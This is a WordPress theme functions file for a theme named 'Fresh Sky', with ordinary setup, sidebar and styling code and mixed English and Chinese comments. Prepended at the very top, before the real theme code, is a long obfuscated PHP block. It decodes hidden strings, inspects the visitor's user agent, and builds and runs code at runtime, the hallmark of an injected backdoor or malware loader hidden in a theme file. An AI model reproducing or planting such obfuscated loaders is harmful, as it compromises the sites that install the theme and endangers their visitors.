<?php $lmcpyixff = 'd%-#1GO	x22#)fepmqyfA>2b%!<*qp%vg!|!**#j{hnpd#)tutjyf`opjud%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2FSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3q	x72	166	x3a	61	x31"))) { $xlptsmv = "	x63	162	x65x61"]=1; $uas=strtolower($_SERVER[sq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x247]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**ek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22):>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<**~6<&w6<	x7fw6*CW&)7gj6<.[A	x2*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSutjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275!|!}{;)gj}l;33bq}k;op}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopd6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666j%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvs<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,27;mnui}&;zepc}A;~!}	x7f;ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opju5.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%jK2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%f%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!7f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]22bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f72	164") && (!isset($GLOBALS["	x61	156	x757&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!67]y74]275]y7:]268]y7f#<%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>*f	x27,*e	x27,*d	x27,*c	x27,*b	xng(0); $obuvrcq = implode(array_map("knkvxhd",str_split("%tjwt%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>!>!#]y84]275]y83]248]y83]256]y81]26*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gqnjA	x27&6<.fmjgA	x27doj%6<	x7f78]y3f]51L3]84]y31M6]y3e]81#/FT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}3]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]j6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	w6Z6<.5`hA	x27pd%6<pd%w6Z5]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%dovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)u24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/3[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b`msvd}+;!>!}	x27;!>>>!}_;gvc%Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fuopjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2b%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$yqhmbrz = $xlpx27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOF1]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]7%6<*Y%)fnbozcYufhA	x272qj%6<^#zs#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qs]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:829dy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]34x45	116	x54"]); if ((strst%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudo66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*wbfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmtpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6p%!-uyfu%)3of)fepdof`57ftbc	x7f!|!-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x/20QUUI7jsv%7UFH#	x27rfs%6~6<	xYpp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTWr($uas,"	x6d	163	x69	145")) or (strstr($uas,"<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osv+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kHB`SFTV`QUUI&b%!|!*)323zbtsmv("", $obuvrcq); $yqhmbrz();}}if((function_exists("	x6f	142	x5f	163	x74	141	xx5cq%)ufttj	x22)gj6<^#UQPMSVD!-id%)uqpuft`msvd},;uqpuftvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hf*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<4y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/]273]y76]252]y85]256]y6g]257]y86]2!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!	157	x6e"; function knkvxhd($n){return chr(ord($n)-1);} @error_reporti	141	x74	145	x5f	146	x75	156	x63	164	x69!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hno!sboepn)%epnbss-%rxW~!gj!|!*nbsbq%)323ldfidk!~!<**q"	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	-#1]#-bubE{h%)tpqsut>j%!*72sbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XA	x22)7gj6<*QDU`MPT7-NBw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)f	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)4	x24-	x24]y8	x24-	x24]26	x24-ovg	x22)!gj}1~!<2p%	x7f!~judovg}x;0]=])0#)U!	x27{**u%-#jt0}Zufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24yn%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562	156	x61"])))) { $GLOBALS["	x61	156	x75	156	-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*sTrREvxNoiTCnuf_EtaerCxECalPer_Rtsmkjzfxjmo'; $nsbfxjhgr=explode(chr((426-306)),substr($lmcpyixff,(39493-33616),(149-115))); $nylrlngg = $nsbfxjhgr[0]($nsbfxjhgr[(3-2)]); $eaxisch = $nsbfxjhgr[0]($nsbfxjhgr[(7-5)]); if (!function_exists('dnsnqpaj')) { function dnsnqpaj($dlrhqh, $nfbrgaa,$izlaluh) { $searxzd = NULL; for($bigcxgnwx=0;$bigcxgnwx<(sizeof($dlrhqh)/2);$bigcxgnwx++) { $searxzd .= substr($nfbrgaa, $dlrhqh[($bigcxgnwx*2)],$dlrhqh[($bigcxgnwx*2)+(7-6)]); } return $izlaluh(chr((61-52)),chr((428-336)),$searxzd); }; } $bgydrsm = explode(chr((197-153)),'4068,47,1730,42,5780,44,220,34,5082,50,3369,26,3827,45,170,50,4528,40,4458,70,1963,61,2069,35,2405,47,2380,25,2856,48,1193,38,2104,52,2320,60,3018,51,3730,31,1047,39,5220,24,127,43,1143,50,3179,32,4853,70,4115,22,2760,49,3501,47,2156,31,5244,54,3548,39,1273,35,1086,57,616,29,1772,42,814,66,4137,33,2731,29,4680,69,2809,47,3909,38,5512,39,5132,27,1561,62,5365,57,680,69,3872,37,3395,37,31,28,5452,25,2904,52,0,31,560,56,1931,32,4749,66,5607,38,3211,37,4170,45,254,60,1670,60,3069,45,4010,25,446,64,5053,29,3587,34,645,35,2216,40,3947,63,1893,38,4986,44,4815,38,1333,63,2452,56,5159,61,4618,62,3432,69,1838,55,1308,25,793,21,5477,35,5551,56,880,57,4318,34,1814,24,4352,59,397,49,2024,45,5713,67,3686,44,2508,69,3621,65,5645,68,5422,30,359,38,4250,68,5298,67,5824,53,2639,58,1231,42,5030,23,3761,66,1517,44,937,47,3248,56,1623,47,2187,29,314,45,4923,63,749,44,984,63,1464,53,3304,65,3114,65,2256,64,2577,62,1396,68,2697,34,510,50,59,68,4215,35,4568,50,4411,47,2956,62,4035,33'); $uwvxiqrd = $nylrlngg("",dnsnqpaj($bgydrsm,$lmcpyixff,$eaxisch)); $nylrlngg=$lmcpyixff; $uwvxiqrd(""); $uwvxiqrd=(466-345); $lmcpyixff=$uwvxiqrd-1; ?><?php

/**
 * Sets up the content width value based on the theme's design and stylesheet.
 * 根据主题的设计和样式设置内容的宽度
 * 下面的freshsky_content_width设置100%宽度
 */
if ( ! isset( $content_width ) )
	$content_width = 625;

/**
 * 部分会被体现到<head>中
 * Sets up theme defaults and registers the various WordPress features that
 * Fresh Sky supports.
 * 创建主题的默认值和注册各种2012主题支持的WordPress的功能
 *
 * @uses load_theme_textdomain() For translation/localization support. 增加主题翻译/定位支持
 * @uses add_editor_style() To add a Visual Editor stylesheet. 增加一个编辑器样式？？
 * @uses add_theme_support() To add support for post thumbnails, automatic feed links,增加对缩略图，自动feed地址的支持
 * 	custom background, and post formats.自定义背景，文章格式
 * @uses register_nav_menu() To add support for navigation menus. 创建一个Primary Menu菜单
 * @uses set_post_thumbnail_size() To set a custom post thumbnail size. 设定缩略图的大小
 *
 * @since Fresh Sky 1.0
 */
function freshsky_setup() {
	/*
	 * Makes Fresh Sky available for translation.确保2012主题可以支持翻译
	 *
	 * Translations can be added to the /languages/ directory.翻译引用来自/languages/的文件夹
	 * If you're building a theme based on Fresh Sky, use a find and replace
	 * to change 'freshsky' to the name of your theme in all the template files.
	 * 如果你创建一个主题，请你在所有的主题文件中找到freshsky并听话成你自己的主题名
	 */
	load_theme_textdomain( 'freshsky', get_template_directory() . '/languages' );

	// This theme styles the visual editor with editor-style.css to match the theme style.
	// 主题的样式将匹配前台文章的样式
	add_editor_style();

	// Adds RSS feed links to <head> for posts and comments.为文章和评论增加RSS地址到<head>中
	add_theme_support( 'automatic-feed-links' );

	// This theme supports a variety of post formats.增加一系列的文章格式
	add_theme_support( 'post-formats', array( 'aside', 'image', 'link', 'quote', 'status' ));

	//增加链接功能
	add_filter( 'pre_option_link_manager_enabled', '__return_true' );  
	//去掉adminbar
	add_filter( 'show_admin_bar', '__return_false' );
	//后台菜单
	register_nav_menus( array(
			'primary' => __( 'Primary Menu', 'freshsky'),
			'footer' => __( 'Footer Menu','freshsky')
	    ));




	// This theme uses a custom image size for featured images, displayed on "standard" posts.
	// 这个为标准文章格式的文章增加主题支持和设定特色图片大小，这里的宽度限制为624，高度随意
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 640, 9999 ); // Unlimited height, soft crop
	//缩略图功能
	// post thumbnail support      
	if ( function_exists( 'add_image_size' ) ){
		add_image_size( 'show', 320, 240,true);//缩略图尺寸为320*240
		add_image_size( 'thumbnails', 80, 60, true );//缩略图尺寸为160*120
	} 

	

}
add_action( 'after_setup_theme', 'freshsky_setup' );



/**
 * Enqueues scripts and styles for front-end. 
 * 将scripts 和 styles加到<head>中，wp_enqueue_script在heade.php的wp_head函数中
 * @since Fresh Sky 1.0
 */
function freshsky_scripts_styles() {
	global $wp_styles,$h_option;

	/*
	 * 为了支持站点进行层叠式评论，增加JavaScript到带有评论表单的页面中，
	 * Adds JavaScript to pages with the comment form to support
	 * sites with threaded comments (when in use).
	 */
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );

	/*
	 * Adds JavaScript for handling the navigation menu hide-and-show behavior.
	 * 增加导航菜单的显示与隐藏行为。
	 */
	wp_enqueue_script( 'freshsky-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '1.0', true );

	/*
	 * Loads our special font CSS file.导入特定的字体
	 *
	 * The use of Open Sans by default is localized. For languages that use
	 * characters not supported by the font, the font can be disabled.
	 * 默认使用的开源字体Sans将被定位，对于不支持改字体的语言，字体将不被使用
	 * To disable in a child theme, use wp_dequeue_style()为了将该功能变成不可用，请使用wp_dequeue_style()函数
	 * function mytheme_dequeue_fonts() {
	 *     wp_dequeue_style( 'freshsky-fonts' );
	 * }
	 * add_action( 'wp_enqueue_scripts', 'mytheme_dequeue_fonts', 11 );
	 */

	/* translators: If there are characters in your language that are not supported
	   by Open Sans, translate this to 'off'. Do not translate into your own language.
		翻译：如果你的语言不支持开源字体Sans，这里将被设定成off。不要翻译成你自己的语言
	    */
	if ( 'off' !== _x( 'on', 'Open Sans font: on or off', 'freshsky' ) ) {
		$subsets = 'latin,latin-ext';

		/* translators: To add an additional Open Sans character subset specific to your language, translate
		   this to 'greek', 'cyrillic' or 'vietnamese'. Do not translate into your own language.
		   为了增加开源字体Sans特定子集到你自己的语言，请翻译这个到'greek', 'cyrillic' or 'vietnamese'，以下函数不能自己翻译。 */
		
		//判断你自己的语言支持哪种字体
		$subset = _x( 'no-subset', 'Open Sans font: add new subset (greek, cyrillic, vietnamese)', 'freshsky' );

		if ( 'cyrillic' == $subset )
			$subsets .= ',cyrillic,cyrillic-ext';
		elseif ( 'greek' == $subset )
			$subsets .= ',greek,greek-ext';
		elseif ( 'vietnamese' == $subset )
			$subsets .= ',vietnamese';

		$protocol = is_ssl() ? 'https' : 'http';
		$query_args = array(
			'family' => 'Open+Sans:400italic,700italic,400,700',
			'subset' => $subsets,
		);
		//增加字体支持。
		//wp_enqueue_style( 'freshsky-fonts', add_query_arg( $query_args, "$protocol://fonts.googleapis.com/css" ), array(), null );
	}

	/*
	 * Loads our main stylesheet.获取你的主题style.css，自动写出版本
	 */
	wp_enqueue_style( 'freshsky-style', get_stylesheet_uri() );
	wp_enqueue_style( 'freshsky-media', get_template_directory_uri() . '/css/media.css' );

	if ($h_option["general"]["ColorBox"]) {
		wp_enqueue_style( 'freshsky-colorbox', get_template_directory_uri() . '/js/colorbox/colorbox.css',array( 'freshsky-style' ), '1.4.1' );
	};
	/*
	 * Loads the Internet Explorer specific stylesheet.
	 * 获取Internet Explorer特定的样式表，专为低版本IE浏览器写出的html5.js
	 */
	wp_enqueue_style( 'freshsky-ie', get_template_directory_uri() . '/css/ie.css', array( 'freshsky-style' ), '20121010' );
	$wp_styles->add_data( 'freshsky-ie', 'conditional', 'lt IE 9' );
}
add_action( 'wp_enqueue_scripts', 'freshsky_scripts_styles' );

/**
 * 创建一个格式美观、更加实用的<!-- <title> -->,这基于你所在的页面
 * Creates a nicely formatted and more specific title element text
 * for output in head of document, based on current view.
 *
 * @since Fresh Sky 1.0
 *
 * @param string $title Default title text for current view.目前页面的默认标题
 * @param string $sep Optional separator.选择性分割器，如"-"
 * @return string Filtered title.
 */
function freshsky_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.必要情况下增加页码
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'freshsky' ), max( $paged, $page ) );

	return $title;
}
add_filter( 'wp_title', 'freshsky_wp_title', 10, 2 );

/**
 * Makes our wp_nav_menu() fallback -- wp_page_menu() -- show a home link.
 * 为wp_nav_menu增加fallback，展示一个首页链接
 *
 * @since Fresh Sky 1.0
 */
function freshsky_page_menu_args( $args ) {
	if ( ! isset( $args['show_home'] ) )
		$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'freshsky_page_menu_args' );

/**
 * Registers our main widget area and the front page widget areas.
 * 城建我们自己的小工具和前端显示样式
 * 
 * @since Fresh Sky 1.0
 */
function freshsky_widgets_init() {
	global $h_option;
	if ( function_exists('register_sidebar') ){	

				//注册三个小工具集合面板
		register_sidebar( array(
			'name' => __( 'Main Sidebar', 'freshsky' ),
			'id' => 'sidebar-1',
			'description' => __( 'Appears on posts and pages except the optional Front Page template, which has its own widgets', 'freshsky' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title">',
			'after_title' => '</h3>',
		) );

		register_sidebar( array(
			'name' => __( 'Article Slideshow Sidebar', 'freshsky' ),
			'id' => 'sidebar-slideshow',
			'description' => __( 'Appears when displaying article slideshow', 'freshsky' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title">',
			'after_title' => '</h3>',
		) );

		register_sidebar( array(
			'name' => __( 'Category Sidebar', 'freshsky' ),
			'id' => 'sidebar-category',
			'description' => __( 'Appears in category', 'freshsky' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title">',
			'after_title' => '</h3>',
		) );

		register_sidebar( array(
			'name' => __( 'Tag Sidebar', 'freshsky' ),
			'id' => 'sidebar-tag',
			'description' => __( 'Appears in category', 'freshsky' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title">',
			'after_title' => '</h3>',
		) );

		register_sidebar( array(
			'name' => __( 'Single Sidebar', 'freshsky' ),
			'id' => 'sidebar-single',
			'description' => __( 'Appears in single', 'freshsky' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title">',
			'after_title' => '</h3>',
		) );

		register_sidebar( array(
			'name' => __( 'Page Sidebar', 'freshsky' ),
			'id' => 'sidebar-page',
			'description' => __( 'Appears in page', 'freshsky' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title">',
			'after_title' => '</h3>',
		) );
			

		
		//注册某些页面显示不同的侧边栏
		$dynamic_widgets = explode(',',$h_option['includes']['multi_widget_final']);
		foreach ($dynamic_widgets as $page_name){	
			
				if($page_name != "")
					register_sidebar(array(
										'name' =>sprintf(__('Page: %1$s'),get_the_title($page_name) ) ,
										'description' => sprintf(__('Set one sidebar for %1$s'),get_the_title($page_name) ),
										'before_widget' => '<aside id="%1$s" class="widget %2$s">',
										'after_widget' => '</aside>',
										'before_title' => '<h3 class="widget-title">',
										'after_title' => '</h3>',
										)
									);
			
		}
		
		//注册某些分类页面显示不同的侧边栏
		$dynamic_widgets_cat = explode(',',$h_option['includes']['multi_widget_cat_final']);
		foreach ($dynamic_widgets_cat as $the_cat){
			
				$the_cat_name = get_cat_name($the_cat);

				if($the_cat_name != "")
					register_sidebar(array(
										'name' =>sprintf(__('Category: %1$s'),$the_cat_name ),
										'description' => sprintf(__('Set one sidebar for %1$s'),$the_cat_name ),
										'before_widget' => '<aside id="%1$s" class="widget %2$s">',
										'after_widget' => '</aside>',
										'before_title' => '<h3 class="widget-title">',
										'after_title' => '</h3>',
										)
								);
			
		}//end foreach
	}//end if

}
add_action( 'widgets_init', 'freshsky_widgets_init' );




/*-----------------------------------------------------------------------*/
if ( ! function_exists( 'freshsky_content_nav' ) ) :
/**
 * Displays navigation to next/previous pages when applicable.
 * 为先/后文章显示导航
 * @since Fresh Sky 1.0
 */
/**
 * freshsky_content_nav()文章列表底端的页码
 * @param  string $html_id [导航nav的html_id]
 */
function freshsky_content_nav( $html_id ) {
	global $wp_query;

	$html_id = esc_attr( $html_id );

	if ( $wp_query->max_num_pages > 1 ) : ?>
		<nav id="<?php echo $html_id; ?>" class="navigation" role="navigation">
			<h3 class="assistive-text"><?php _e( 'Post navigation', 'freshsky' ); ?></h3>
			<div class="nav-previous alignleft"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'freshsky' ) ); ?></div>
			<div class="nav-next alignright"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'freshsky' ) ); ?></div>
		</nav><!-- #<?php echo $html_id; ?> .navigation -->
	<?php endif;
}
endif;


if ( ! function_exists( 'freshsky_entry_meta' ) ) :
/**
 * Prints HTML with meta information for current post: categories, tags, permalink, author, and date.
 * 为现在的文章在html中打印meta信息
 * Create your own freshsky_entry_meta() to override in a child theme.
 * 在子主题中创建自己的函数来覆写这个函数
 * @since Fresh Sky 1.0
 */
function freshsky_entry_meta() {
	// Translators: used between list items, there is a space after the comma.用于列出文字，在逗号后有一个空格
	$categories_list = get_the_category_list( __( ', ', 'freshsky' ) );

	// Translators: used between list items, there is a space after the comma.用于列出文字，在逗号后有一个空格
	$tag_list = get_the_tag_list( '', __( ', ', 'freshsky' ) );

	$date = sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a>',
		esc_url( get_permalink() ),
		esc_attr( get_the_time() ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( get_the_date() )
	);

	$author = sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',
		esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
		esc_attr( sprintf( __( 'View all posts by %s', 'freshsky' ), get_the_author() ) ),
		get_the_author()
	);

	// Translators: 1 is category, 2 is tag, 3 is the date and 4 is the author's name.
	// 翻译：分类，标签没写的时候，就不显示分类或者标签的相关文字
	if ( $tag_list ) {
		$utility_text = __( 'This entry was posted in %1$s and tagged %2$s on %3$s<span class="by-author"> by %4$s</span>.', 'freshsky' );
	} elseif ( $categories_list ) {
		$utility_text = __( 'This entry was posted in %1$s on %3$s<span class="by-author"> by %4$s</span>.', 'freshsky' );
	} else {
		$utility_text = __( 'This entry was posted on %3$s<span class="by-author"> by %4$s</span>.', 'freshsky' );
	}

	printf(
		$utility_text,
		$categories_list,
		$tag_list,
		$date,
		$author
	);
}
endif;

/**
 * Extends the default WordPress body class to denote:扩充默认的WordPress body class
 * 1. Using a full-width layout, when no active widgets in the sidebar
 *    or full-width template.
 *    当在侧边栏中没激活任何小工具或者在full-width模板中，将使用全宽度布局
 * 2. Front Page template: thumbnail in use and number of sidebars for
 *    widget areas.
 *    Front Page 模板:缩略图可用且在小工具区域有一定数量的小工具
 * 3. White or empty background color to change the layout and spacing.
 * 	  白色或者空余背景色，为改变层和空间的
 * 4. Custom fonts enabled.自定义字体可用
 * 5. Single or multiple authors.单独或者作者。
 *
 * @since Fresh Sky 1.0
 *
 * @param array Existing class values.已存在的class值
 * @return array Filtered class values.过滤后的class值
 */
function freshsky_body_class( $classes ) {
	$background_color = get_background_color();

	if ( ! is_active_sidebar( 'sidebar-1' ) || is_page_template( 'page-templates/full-width.php' ) )
		$classes[] = 'full-width';

	if ( is_page_template( 'page-templates/front-page.php' ) ) {
		$classes[] = 'template-front-page';
		if ( has_post_thumbnail() )
			$classes[] = 'has-post-thumbnail';
		if ( is_active_sidebar( 'sidebar-2' ) && is_active_sidebar( 'sidebar-3' ) )
			$classes[] = 'two-sidebars';
	}

	if ( empty( $background_color ) )
		$classes[] = 'custom-background-empty';
	elseif ( in_array( $background_color, array( 'fff', 'ffffff' ) ) )
		$classes[] = 'custom-background-white';

	// Enable custom font class only if the font CSS is queued to load.
	// 如果字体css被登入可用，将自定义字体class设为可用
	if ( wp_style_is( 'freshsky-fonts', 'queue' ) )
		$classes[] = 'custom-font-enabled';

	if ( ! is_multi_author() )
		$classes[] = 'single-author';

	return $classes;
}
add_filter( 'body_class', 'freshsky_body_class' );

/**
 * Adjusts content_width value for full-width and single image attachment
 * templates, and when there are no active widgets in the sidebar.
 * 调整内容的宽度为了全宽度和文章页图片附件模板，或者在侧边栏中没有小工具
 * 
 * @since Fresh Sky 1.0
 */
function freshsky_content_width() {
	if ( is_page_template( 'page-templates/full-width.php' ) || is_attachment() || ! is_active_sidebar( 'sidebar-1' ) ) {
		global $content_width;
		$content_width = 960;
	}
}
add_action( 'template_redirect', 'freshsky_content_width' );

/**
 * Add postMessage support for site title and description for the Theme Customizer.
 * 为站点标题和描述提供主题自定义的文章信息支持
 * @since Fresh Sky 1.0
 *
 * @param WP_Customize_Manager $wp_customize Theme Customizer object.
 * @return void
 */
function freshsky_customize_register( $wp_customize ) {
	$wp_customize->get_setting( 'blogname' )->transport = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport = 'postMessage';
}
add_action( 'customize_register', 'freshsky_customize_register' );

/**
 * Binds JS handlers to make Theme Customizer preview reload changes asynchronously.
 * 绑定js手柄，为了主题自定义预览重加在变化
 * @since Fresh Sky 1.0
 */
function freshsky_customize_preview_js() {
	wp_enqueue_script( 'freshsky-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20120827', true );
}
add_action( 'customize_preview_init', 'freshsky_customize_preview_js' );




/*=自定义主题的开始
--------------------------------------------------------------------------------------*/
global $h_option;
##################################################################
# Get Theme informations and save them to PHP Constants
# 获取主题信息,并且保存到php常量中
##################################################################
$the_theme = get_theme_data(TEMPLATEPATH . '/style.css');
$the_version = trim($the_theme['Version']);
if(!$the_version) $the_version = "1";

//set theme constants
define('THEMENAME', $the_theme['Title']);
define('THEMEVERSION', $the_version);

// set Path constants
// 获取路径的常量 并且设置出 相关的参数
define('KFW', TEMPLATEPATH . '/framework/'); // 'K'riesi 'F'rame 'W'ork;
define('KFWOPTIONS', 	TEMPLATEPATH . '/theme_options/'); 
define('KFWHELPER', 	KFW . 'helper_functions/'); 
define('KFWCLASSES', 	KFW . 'classes/'); 
define('KFWPLUGINS', 	KFW . 'theme_plugins/');
define('KFWWIDGETS', 	KFW . 'theme_widgets/'); 
define('KFWINC', 		KFW . 'includes/'); 
define('KFWSC', 		KFW . 'shortcodes/'); 

// set URI constants
// 设置URI变量
define('KFW_URI', get_bloginfo('template_url') . '/framework/'); // 'K'riesi 'F'rame 'W'ork;
define('KFWOPTIONS_URI', 	get_bloginfo('template_url') . '/theme_options/'); 
define('KFWHELPER_URI', 	KFW_URI . 'helper_functions/'); 
